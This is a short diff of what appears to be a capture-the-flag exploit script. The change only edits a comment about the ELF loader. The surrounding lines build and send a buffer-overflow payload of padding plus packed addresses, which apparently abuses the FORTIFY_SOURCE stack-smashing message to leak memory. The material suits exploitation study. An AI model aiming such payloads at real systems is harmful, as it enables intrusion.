@@ -48,7 +48,7 @@ if __name__ == "__main__":
 # "Fun with FORTIFY_SOURCE", http://seclists.org/bugtraq/2010/Apr/243
 # argv & envp on stack, http://softwaretechnique.jp/OS_Development/Supplement/Binary/elf_stack.html
 # 0x600d20 is obvious.
-# 0x400d20... I will figure it out (binfmt_elf.c)
+# 0x400d20... Why does ELF loader duplicate the string? I will figure it out later (binfmt_elf.c)
 
     payload = "A" * 0x218 + p64(0x400d20) + p64(0) + p64(0x600d20) + '\n'
     r.send(payload)
